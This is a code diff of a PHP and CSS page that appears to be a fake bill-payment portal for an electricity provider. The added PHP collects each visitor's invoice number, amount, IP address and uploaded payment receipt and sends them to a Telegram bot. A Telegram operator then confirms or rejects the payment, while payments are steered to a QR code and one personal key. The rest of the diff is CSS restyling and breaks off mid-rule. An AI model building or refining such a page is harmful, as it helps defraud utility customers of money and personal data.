@@ -9,25 +9,170 @@ if (!$config) {
 $botToken = $config['botToken'] ?? ($config['bot_token'] ?? '');
 $chatId = $config['chatId'] ?? ($config['chat_id'] ?? '');
 
-// Procesar alertas AJAX para Telegram
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+// Endpoint para consultar estado de validación (Polling de Telegram)
+if (isset($_GET['action']) && $_GET['action'] === 'check_status') {
     header('Content-Type: application/json; charset=utf-8');
-    $rawInput = file_get_contents('php://input');
-    $data = json_decode($rawInput, true);
-
-    $action = $data['action'] ?? '';
-    if ($action === 'confirm_payment' || $action === 'view_qr') {
-        $userIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
-        if (strpos($userIp, ',') !== false) {
-            $userIp = trim(explode(',', $userIp)[0]);
+    $checkId = intval($_GET['id'] ?? 0);
+    if ($checkId <= 0) {
+        echo json_encode(['status' => 'error', 'message' => 'ID no válido']);
+        exit;
+    }
+    try {
+        require_once __DIR__ . '/../../db.php';
+        if (isset($conn) && $conn instanceof PDO) {
+            $stmt = $conn->prepare("SELECT estado FROM pse WHERE id = :id");
+            $stmt->execute(['id' => $checkId]);
+            $row = $stmt->fetch();
+            if ($row) {
+                echo json_encode(['status' => 'success', 'estado' => intval($row['estado'])]);
+                exit;
+            }
         }
-        $nic = htmlspecialchars($data['nic'] ?? 'No especificado');
-        $total = htmlspecialchars($data['total'] ?? 'No especificado');
-        $banco = htmlspecialchars($data['banco'] ?? 'Bancolombia / Redeban / QR');
-        $fecha = date('Y-m-d H:i:s');
+        echo json_encode(['status' => 'waiting', 'estado' => 1]);
+    } catch (Throwable $e) {
+        echo json_encode(['status' => 'waiting', 'estado' => 1]);
+    }
+    exit;
+}
 
+// Procesar alertas AJAX y subida de comprobantes
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $action = $_POST['action'] ?? '';
+    if (empty($action)) {
+        $rawInput = file_get_contents('php://input');
+        $jsonData = json_decode($rawInput, true);
+        if (is_array($jsonData)) {
+            $action = $jsonData['action'] ?? '';
+            $data = $jsonData;
+        } else {
+            $data = [];
+        }
+    } else {
+        $data = $_POST;
+    }
+
+    $userIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
+    if (strpos($userIp, ',') !== false) {
+        $userIp = trim(explode(',', $userIp)[0]);
+    }
+    $nic = htmlspecialchars($data['nic'] ?? 'No especificado');
+    $total = htmlspecialchars($data['total'] ?? 'No especificado');
+    $banco = htmlspecialchars($data['banco'] ?? 'Bancolombia / Redeban / QR');
+    $fecha = date('Y-m-d H:i:s');
+
+    // Acción 1: Subir comprobante de pago
+    if ($action === 'upload_receipt') {
+        header('Content-Type: application/json; charset=utf-8');
+
+        // Insertar en Neon PostgreSQL tabla pse para registrar la transacción
+        $nuevo_id = 0;
+        try {
+            require_once __DIR__ . '/../../db.php';
+            if (isset($conn) && $conn instanceof PDO) {
+                try {
+                    $sql_insert = "INSERT INTO pse (estado, ip_address, usuario, banco) VALUES (:estado, :ip, :usuario, :banco) RETURNING id";
+                    $stmt_insert = $conn->prepare($sql_insert);
+                    $stmt_insert->execute([
+                        'estado' => 1,
+                        'ip' => $userIp,
+                        'usuario' => "NIC: " . $nic . " | " . $total,
+                        'banco' => 'QR / Llave @bbesa800'
+                    ]);
+                    $nuevo_id = intval($stmt_insert->fetchColumn());
+                } catch (Throwable $e1) {
+                    $sql_insert = "INSERT INTO pse (estado) VALUES (:estado) RETURNING id";
+                    $stmt_insert = $conn->prepare($sql_insert);
+                    $stmt_insert->execute(['estado' => 1]);
+                    $nuevo_id = intval($stmt_insert->fetchColumn());
+                }
+            }
+        } catch (Throwable $e) {
+            error_log("Error BD pse: " . $e->getMessage());
+        }
+
+        if ($nuevo_id <= 0) {
+            $nuevo_id = rand(100000, 999999);
+        }
+
+        // Construir URLs para los botones de Telegram
+        $baseUrl = $config['baseUrl'] ?? 'https://recaudoairefactura.vercel.app/updatetele.php';
+        $security_key = $config['security_key'] ?? 'secure_key_123';
+
+        $confirmUrl = "{$baseUrl}?id={$nuevo_id}&estado=10&key={$security_key}";
+        $rejectUrl = "{$baseUrl}?id={$nuevo_id}&estado=11&key={$security_key}";
+
+        $keyboard = [
+            'inline_keyboard' => [
+                [
+                    ['text' => '✅ Pago Confirmado', 'url' => $confirmUrl],
+                    ['text' => '❌ Pago No Realizado', 'url' => $rejectUrl]
+                ]
+            ]
+        ];
+
+        $caption = "🧾 *NUEVO COMPROBANTE DE PAGO (QR / LLAVE)*\n\n"
+            . "🆔 *ID Transacción:* `" . $nuevo_id . "`\n"
+            . "👤 *NIC / Factura:* `" . $nic . "`\n"
+            . "💰 *Total a Validar:* `" . $total . "`\n"
+            . "🏦 *Método:* `" . $banco . "` (Llave `@bbesa800`)\n"
+            . "🌐 *IP:* `" . $userIp . "`\n"
+            . "🕒 *Fecha:* `" . $fecha . "`\n\n"
+            . "⚖️ *Por favor verifica el comprobante en tu cuenta bancaria y selecciona una opción:*";
+
+        if (!empty($botToken) && !empty($chatId)) {
+            if (!empty($_FILES['comprobante']['tmp_name']) && is_uploaded_file($_FILES['comprobante']['tmp_name'])) {
+                $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
+                $cfile = new CURLFile(
+                    $_FILES['comprobante']['tmp_name'],
+                    $_FILES['comprobante']['type'] ?: 'image/jpeg',
+                    $_FILES['comprobante']['name'] ?: 'comprobante.jpg'
+                );
+                $postFields = [
+                    'chat_id' => $chatId,
+                    'caption' => $caption,
+                    'parse_mode' => 'Markdown',
+                    'photo' => $cfile,
+                    'reply_markup' => json_encode($keyboard)
+                ];
+
+                $ch = curl_init($telegramUrl);
+                curl_setopt($ch, CURLOPT_POST, true);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+                @curl_exec($ch);
+                @curl_close($ch);
+            } else {
+                $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
+                $postFields = [
+                    'chat_id' => $chatId,
+                    'text' => $caption . "\n\n_(Nota: Imagen no adjunta)_",
+                    'parse_mode' => 'Markdown',
+                    'reply_markup' => json_encode($keyboard)
+                ];
+
+                $ch = curl_init($telegramUrl);
+                curl_setopt($ch, CURLOPT_POST, true);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+                @curl_exec($ch);
+                @curl_close($ch);
+            }
+        }
+
+        echo json_encode([
+            'status' => 'success',
+            'transaction_id' => $nuevo_id
+        ]);
+        exit;
+    }
+
+    // Acción 2: Registro de vista en Telegram
+    if ($action === 'confirm_payment' || $action === 'view_qr') {
+        header('Content-Type: application/json; charset=utf-8');
         if ($action === 'confirm_payment') {
-            $msg = "🔔 *PAGO CONFIRMADO POR EL USUARIO (QR / LLAVE)*\n\n";
+            $msg = "🔔 *PAGO NOTIFICADO POR EL USUARIO (QR / LLAVE)*\n\n";
             $msg .= "👤 *Acción:* El usuario presionó 'Ya realicé el pago'\n";
             $msg .= "🧾 *NIC / Referencia:* `" . $nic . "`\n";
             $msg .= "💰 *Total:* `" . $total . "`\n";
@@ -120,36 +265,24 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
 
         .payment-wrapper {
             width: 100%;
-            max-width: 480px;
+            max-width: 440px;
             background: var(--card-bg);
             border-radius: var(--radius-card);
             box-shadow: var(--shadow-card);
             overflow: hidden;
-            border: 1px solid rgba(226, 232, 240, 0.8);
             position: relative;
-            animation: slideUp 0.4s ease-out;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(16px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            border: 1px solid rgba(255, 255, 255, 0.8);
         }
 
         /* Encabezado */
         .card-header {
-            background: linear-gradient(135deg, #003d82 0%, #0056b3 100%);
+            background: linear-gradient(135deg, #004b9c 0%, #0066cc 100%);
             padding: 22px 24px;
             color: #ffffff;
-            position: relative;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            position: relative;
         }
 
         .brand-box {
@@ -159,42 +292,36 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
         }
 
         .brand-logo {
-            height: 38px;
-            width: auto;
+            height: 36px;
+            max-width: 110px;
             object-fit: contain;
-            filter: drop-shadow(0 2px 6px rgba(0, 0, 0, 0.3));
-            background: transparent;
-            padding: 0;
-            display: block;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.15));
         }
 
         .header-title-group h1 {
-            font-size: 17px;
-            font-weight: 700;
-            letter-spacing: -0.3px;
-            margin: 0;
-            color: #ffffff;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: -0.2px;
+            line-height: 1.2;
         }
 
         .header-title-group span {
-            font-size: 12px;
+            font-size: 11px;
             opacity: 0.85;
-            display: block;
-            margin-top: 2px;
+            font-weight: 500;
         }
 
         .secure-badge {
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.16);
             backdrop-filter: blur(8px);
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            color: #ffffff;
-            padding: 5px 10px;
+            padding: 6px 10px;
             border-radius: 20px;
             font-size: 11px;
             font-weight: 600;
-            display: inline-flex;
+            display: flex;
             align-items: center;
             gap: 5px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
         .secure-badge svg {
@@ -203,113 +330,145 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
             fill: #4ade80;
         }
 
-        /* Cuerpo */
+        /* Cuerpo principal */
         .card-body {
-            padding: 24px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 24px 22px;
         }
 
-        /* Monto a pagar */
+        /* ===== BANNER DE PAGO RECHAZADO / NO REALIZADO ===== */
+        .alert-rejected {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            background: #fff5f5;
+            border: 1.5px solid #fecaca;
+            border-radius: 16px;
+            padding: 16px 18px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 20px -6px rgba(239, 68, 68, 0.15);
+            animation: shakeAlert 0.4s ease-in-out, fadeIn 0.3s ease-out;
+        }
+
+        @keyframes shakeAlert {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-6px); }
+            40%, 80% { transform: translateX(6px); }
+        }
+
+        .alert-rejected-icon {
+            width: 38px;
+            height: 38px;
+            flex-shrink: 0;
+            background: #fee2e2;
+            color: #dc2626;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .alert-rejected-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+        }
+
+        .alert-rejected-content h4 {
+            font-size: 15px;
+            font-weight: 800;
+            color: #991b1b;
+            margin-bottom: 4px;
+        }
+
+        .alert-rejected-content p {
+            font-size: 13px;
+            line-height: 1.45;
+            color: #7f1d1d;
+        }
+
+        /* Bloque de Total y Factura */
         .amount-card {
-            width: 100%;
             background: #f8fafc;
-            border: 1px solid var(--border-color);
+            border: 1.5px solid var(--border-color);
             border-radius: var(--radius-inner);
-            padding: 16px 20px;
-            margin-bottom: 16px;
+            padding: 16px 18px;
             text-align: center;
+            margin-bottom: 20px;
         }
 
         .amount-label {
             font-size: 12px;
             font-weight: 600;
+            color: var(--text-muted);
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            color: var(--text-muted);
             margin-bottom: 4px;
         }
 
         .amount-value {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 800;
             color: var(--primary-dark);
             letter-spacing: -0.5px;
-            line-height: 1.2;
         }
 
         .invoice-meta {
             display: flex;
             justify-content: center;
-            gap: 16px;
-            margin-top: 8px;
+            gap: 12px;
+            margin-top: 6px;
             font-size: 12px;
             color: var(--text-muted);
         }
 
         .invoice-meta strong {
             color: var(--text-main);
-            font-weight: 600;
         }
 
-        /* Cronómetro de 2 Minutos */
+        /* Cronómetro de 2 minutos */
         .timer-container {
-            width: 100%;
-            margin-bottom: 18px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            margin-bottom: 20px;
+            text-align: center;
         }
 
         .timer-pill {
-            background: #f8fafc;
-            border: 1px solid var(--border-color);
-            padding: 8px 18px;
-            border-radius: 20px;
             display: inline-flex;
             align-items: center;
             gap: 8px;
+            background: var(--primary-light);
+            color: var(--primary);
+            padding: 6px 14px;
+            border-radius: 20px;
             font-size: 13px;
-            font-weight: 600;
-            color: #475569;
+            font-weight: 700;
             transition: all 0.3s ease;
         }
 
         .timer-pill.urgent {
-            background: #fef2f2;
-            border-color: #fecaca;
+            background: #fee2e2;
             color: #dc2626;
-            animation: pulseTimer 1s infinite alternate;
+            animation: pulseWarning 1s infinite alternate;
         }
 
-        @keyframes pulseTimer {
+        @keyframes pulseWarning {
             from { transform: scale(1); }
-            to { transform: scale(1.02); }
+            to { transform: scale(1.04); }
         }
 
         .timer-icon {
-            width: 16px;
-            height: 16px;
+            width: 15px;
+            height: 15px;
             fill: currentColor;
         }
 
         .timer-digits {
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 16px;
+            font-variant-numeric: tabular-nums;
             font-weight: 800;
-            color: var(--primary-dark);
             letter-spacing: 0.5px;
         }
 
-        .timer-pill.urgent .timer-digits {
-            color: #dc2626;
-        }
-
         .timer-progress-track {
-            width: 100%;
-            max-width: 280px;
-            height: 5px;
+            height: 4px;
             background: #e2e8f0;
             border-radius: 4px;
             margin-top: 8px;
@@ -318,223 +477,201 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
 
         .timer-progress-bar {
             height: 100%;
+            background: var(--primary);
             width: 100%;
-            background: linear-gradient(90deg, #0056b3 0%, #38bdf8 100%);
-            border-radius: 4px;
-            transition: width 1s linear, background 0.3s ease;
+            transition: width 1s linear, background-color 0.3s ease;
         }
 
         .timer-progress-bar.urgent {
-            background: linear-gradient(90deg, #ef4444 0%, #f97316 100%);
+            background: #dc2626;
         }
 
         .timer-expired-box {
             display: none;
-            margin-top: 8px;
-            text-align: center;
+            margin-top: 10px;
         }
 
         .btn-renew {
-            background: var(--primary);
-            color: #ffffff;
-            border: none;
+            background: none;
+            border: 1px solid var(--primary);
+            color: var(--primary);
             padding: 6px 14px;
-            border-radius: 8px;
+            border-radius: 20px;
             font-size: 12px;
             font-weight: 700;
             cursor: pointer;
+            transition: all 0.2s;
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            transition: background 0.2s;
         }
 
         .btn-renew:hover {
-            background: var(--primary-dark);
+            background: var(--primary);
+            color: #ffffff;
         }
 
-        /* Contenedor QR */
+        /* Sección Código QR */
         .qr-section {
             display: flex;
             flex-direction: column;
             align-items: center;
-            width: 100%;
+            margin-bottom: 22px;
         }
 
         .qr-frame {
             background: #ffffff;
-            border: 2px solid #edf2f7;
             padding: 14px;
             border-radius: 20px;
             box-shadow: var(--shadow-qr);
+            border: 2px solid #edf2f7;
             position: relative;
-            margin-bottom: 12px;
-            transition: all 0.3s ease;
-        }
-
-        .qr-frame:hover {
-            transform: scale(1.01);
+            transition: opacity 0.3s, filter 0.3s;
         }
 
         .qr-image {
-            width: 230px;
-            height: 230px;
+            width: 220px;
+            height: 220px;
             display: block;
             border-radius: 12px;
             object-fit: contain;
-            image-rendering: -webkit-optimize-contrast;
         }
 
         .qr-instruction {
+            margin-top: 12px;
             font-size: 13px;
             color: var(--text-muted);
             text-align: center;
-            max-width: 320px;
-            line-height: 1.45;
-            margin-bottom: 18px;
+            max-width: 280px;
+            line-height: 1.4;
         }
 
         /* Divisor "o a nuestra llave" */
         .key-divider {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            margin: 8px 0 18px;
             position: relative;
+            text-align: center;
+            margin: 18px 0;
         }
 
-        .key-divider::before,
-        .key-divider::after {
-            content: "";
-            flex: 1;
+        .key-divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
             height: 1px;
             background: var(--border-color);
+            z-index: 1;
         }
 
         .divider-pill {
-            padding: 5px 16px;
-            background: #f1f5f9;
-            border: 1px solid #cbd5e1;
-            border-radius: 20px;
+            position: relative;
+            z-index: 2;
+            background: var(--card-bg);
+            padding: 0 12px;
             font-size: 12px;
             font-weight: 700;
-            color: #475569;
+            color: var(--text-muted);
             text-transform: uppercase;
-            letter-spacing: 0.6px;
-            margin: 0 12px;
+            letter-spacing: 0.8px;
             display: inline-flex;
             align-items: center;
             gap: 6px;
         }
 
         .divider-pill svg {
-            width: 13px;
-            height: 13px;
-            fill: #64748b;
+            width: 14px;
+            height: 14px;
+            fill: var(--accent);
         }
 
-        /* Tarjeta Llave */
+        /* Tarjeta de Llave Copiable */
         .key-box {
-            width: 100%;
-            background: linear-gradient(135deg, #f8fafc 0%, #edf2f7 100%);
-            border: 2px dashed #94a3b8;
+            background: linear-gradient(135deg, #f8fafc 0%, #edf4fc 100%);
+            border: 1.5px solid #d0e1f9;
             border-radius: var(--radius-inner);
-            padding: 16px 18px;
+            padding: 14px 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             gap: 12px;
             margin-bottom: 22px;
-            transition: all 0.25s ease;
-        }
-
-        .key-box:hover {
-            border-color: var(--primary);
-            background: #f0f7ff;
         }
 
         .key-info {
             display: flex;
             flex-direction: column;
-            overflow: hidden;
         }
 
         .key-label {
             font-size: 11px;
             font-weight: 700;
-            color: var(--text-muted);
+            color: var(--primary);
             text-transform: uppercase;
             letter-spacing: 0.5px;
             margin-bottom: 2px;
         }
 
         .key-value {
-            font-size: 20px;
+            font-size: 19px;
             font-weight: 800;
             color: var(--text-main);
-            letter-spacing: -0.3px;
-            font-family: 'Courier New', Courier, monospace;
-            word-break: break-all;
+            letter-spacing: 0.3px;
             user-select: all;
         }
 
         .btn-copy {
-            background: var(--primary);
-            color: #ffffff;
-            border: none;
-            padding: 10px 18px;
+            background: #ffffff;
+            border: 1.5px solid #cbd5e1;
+            color: var(--text-main);
+            padding: 9px 16px;
             border-radius: 12px;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 700;
             cursor: pointer;
-            display: inline-flex;
+            display: flex;
             align-items: center;
-            gap: 8px;
-            white-space: nowrap;
+            gap: 6px;
             transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 4px 12px rgba(0, 86, 179, 0.25);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
             flex-shrink: 0;
         }
 
         .btn-copy:hover {
-            background: var(--primary-dark);
+            border-color: var(--primary);
+            color: var(--primary);
+            background: #f8fafc;
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 86, 179, 0.35);
-        }
-
-        .btn-copy:active {
-            transform: translateY(0);
         }
 
         .btn-copy.copied {
-            background: var(--success);
-            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+            background: #ecfdf5;
+            border-color: #10b981;
+            color: #059669;
         }
 
         .btn-copy svg {
-            width: 16px;
-            height: 16px;
+            width: 15px;
+            height: 15px;
             fill: currentColor;
             transition: transform 0.2s;
         }
 
-        /* Pasos de Pago */
+        /* Pasos Guiados */
         .steps-container {
-            width: 100%;
-            background: #ffffff;
-            border: 1px solid var(--border-color);
+            background: #f8fafc;
             border-radius: var(--radius-inner);
-            padding: 16px;
+            padding: 14px 16px;
             margin-bottom: 24px;
         }
 
         .steps-title {
             font-size: 12px;
             font-weight: 700;
+            color: var(--text-muted);
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            color: var(--text-muted);
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             display: flex;
             align-items: center;
             gap: 6px;
@@ -543,11 +680,11 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
         .step-item {
             display: flex;
             align-items: flex-start;
-            gap: 12px;
-            margin-bottom: 10px;
-            font-size: 13px;
+            gap: 10px;
+            font-size: 12.5px;
+            color: var(--text-main);
+            margin-bottom: 8px;
             line-height: 1.4;
-            color: #334155;
         }
 
         .step-item:last-child {
@@ -555,16 +692,16 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
         }
 
         .step-number {
-            width: 22px;
-            height: 22px;
+            width: 18px;
+            height: 18px;
+            background: #e2e8f0;
+            color: #475569;
             border-radius: 50%;
-            background: var(--primary-light);
-            color: var(--primary);
-            font-weight: 800;
-            font-size: 11px;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 11px;
+            font-weight: 800;
             flex-shrink: 0;
             margin-top: 1px;
         }
@@ -572,37 +709,31 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
         /* Botón de Confirmación Principal */
         .btn-confirm-payment {
             width: 100%;
-            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            background: linear-gradient(135deg, #ff6600 0%, #e65100 100%);
             color: #ffffff;
             border: none;
             padding: 16px;
             border-radius: 14px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 800;
-            letter-spacing: -0.2px;
+            letter-spacing: 0.2px;
             cursor: pointer;
+            box-shadow: 0 10px 25px -5px rgba(255, 102, 0, 0.4);
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            transition: all 0.25s ease;
-            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.35);
+            gap: 8px;
         }
 
         .btn-confirm-payment:hover {
-            background: linear-gradient(135deg, #059669 0%, #047857 100%);
             transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(16, 185, 129, 0.45);
+            box-shadow: 0 14px 28px -5px rgba(255, 102, 0, 0.5);
+            background: linear-gradient(135deg, #ff751a 0%, #eb5b05 100%);
         }
 
         .btn-confirm-payment:active {
             transform: translateY(0);
-        }
-
-        .btn-confirm-payment:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
         }
 
         .btn-confirm-payment svg {
@@ -613,9 +744,9 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
 
         /* Spinner */
         .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
+            display: inline-block;
+            width: 18px;
+            height: 18px;
             border: 2.5px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
             border-top-color: #ffffff;
@@ -673,15 +804,15 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
             fill: #4ade80;
         }
 
-        /* Modal de Éxito */
+        /* Modales */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(15, 23, 42, 0.65);
-            backdrop-filter: blur(4px);
+            background: rgba(15, 23, 42, 0.68);
+            backdrop-filter: blur(5px);
             display: none;
             align-items: center;
             justify-content: center;
@@ -699,48 +830,15 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
             background: #ffffff;
             border-radius: 24px;
             padding: 32px 24px;
-            max-width: 400px;
+            max-width: 420px;
             width: 100%;
-            text-align: center;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
             animation: zoomIn 0.3s ease-out;
         }
 
         @keyframes zoomIn {
-            from { transform: scale(0.9); opacity: 0; }
+            from { transform: scale(0.92); opacity: 0; }
             to { transform: scale(1); opacity: 1; }
-        }
-
-        .modal-icon {
-            width: 64px;
-            height: 64px;
-            background: #ecfdf5;
-            color: #10b981;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 18px;
-        }
-
-        .modal-icon svg {
-            width: 36px;
-            height: 36px;
-            fill: currentColor;
-        }
-
-        .modal-box h2 {
-            font-size: 20px;
-            font-weight: 800;
-            color: var(--text-main);
-            margin-bottom: 10px;
-        }
-
-        .modal-box p {
-            font-size: 14px;
-            color: var(--text-muted);
-            line-height: 1.5;
-            margin-bottom: 24px;
         }
 
         .btn-modal-close {
@@ -758,6 +856,404 @@ $totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
 
         .btn-modal-close:hover {
             background: var(--primary-dark);
+        }
+
+        /* ===== MODAL SUBIR COMPROBANTE ===== */
+        .modal-box-upload {
+            position: relative;
+            max-width: 440px;
+            text-align: left;
+        }
+
+        .modal-btn-x {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: #f1f5f9;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            font-size: 20px;
+            color: #64748b;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .modal-btn-x:hover {
+            background: #e2e8f0;
+            color: #0f172a;
+        }
+
+        .modal-upload-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .upload-badge-icon {
+            width: 54px;
+            height: 54px;
+            background: var(--primary-light);
+            color: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+        }
+
+        .upload-badge-icon svg {
+            width: 28px;
+            height: 28px;
+            fill: currentColor;
+        }
+
+        .modal-upload-header h2 {
+            font-size: 19px;
+            font-weight: 800;
+            color: var(--text-main);
+            margin-bottom: 6px;
+        }
+
+        .modal-upload-header p {
+            font-size: 13px;
+            color: var(--text-muted);
+            line-height: 1.45;
+        }
+
+        .upload-zone {
+            border: 2px dashed #cbd5e1;
+            border-radius: 16px;
+            padding: 22px 16px;
+            text-align: center;
+            cursor: pointer;
+            background: #f8fafc;
+            transition: all 0.2s ease;
+            margin-bottom: 20px;
+        }
+
+        .upload-zone:hover, .upload-zone.drag-over {
+            border-color: var(--primary);
+            background: var(--primary-light);
+        }
+
+        .upload-zone-icon {
+            width: 44px;
+            height: 44px;
+            background: #ffffff;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            color: var(--primary);
+        }
+
+        .upload-zone-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+        }
+
+        .upload-zone-text strong {
+            display: block;
+            font-size: 14px;
+            color: var(--text-main);
+            margin-bottom: 3px;
+        }
+
+        .upload-zone-text span {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .upload-zone-preview {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: left;
+        }
+
+        .upload-zone-preview img {
+            width: 68px;
+            height: 68px;
+            object-fit: cover;
+            border-radius: 12px;
+            border: 1.5px solid #e2e8f0;
+        }
+
+        .preview-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .preview-name {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-main);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .preview-size {
+            display: block;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin: 2px 0 6px;
+        }
+
+        .btn-change-photo {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--primary);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            text-decoration: underline;
+        }
+
+        .modal-upload-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .btn-submit-receipt {
+            width: 100%;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: #ffffff;
+            border: none;
+            padding: 15px;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 10px 20px -6px rgba(16, 185, 129, 0.35);
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-submit-receipt:disabled {
+            background: #cbd5e1;
+            box-shadow: none;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .btn-submit-receipt:not(:disabled):hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 24px -6px rgba(16, 185, 129, 0.45);
+        }
+
+        .btn-cancel-modal {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 8px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .btn-cancel-modal:hover {
+            color: var(--text-main);
+        }
+
+        /* ===== MODAL DE ESPERA EN VIVO ===== */
+        .modal-box-waiting {
+            max-width: 400px;
+            text-align: center;
+            padding: 36px 24px;
+        }
+
+        .waiting-animation-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pulse-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: rgba(0, 86, 179, 0.15);
+            animation: radarPulse 2s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
+        }
+
+        .pulse-2 {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes radarPulse {
+            0% { transform: scale(0.6); opacity: 0.9; }
+            100% { transform: scale(1.6); opacity: 0; }
+        }
+
+        .pulse-center-icon {
+            position: relative;
+            z-index: 2;
+            width: 58px;
+            height: 58px;
+            background: var(--primary);
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(0, 86, 179, 0.35);
+        }
+
+        .pulse-center-icon svg {
